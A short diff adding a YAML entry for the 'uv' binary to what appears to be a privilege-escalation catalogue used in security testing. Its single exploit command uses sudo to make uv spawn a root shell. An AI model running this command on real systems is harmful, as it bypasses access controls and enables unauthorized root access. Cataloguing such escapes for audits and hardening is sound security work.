@@ -1,0 +1,4 @@
+name: uv
+binary_path: /usr/bin/uv
+exploit_cmds:
+- sudo /usr/bin/uv run /bin/sh
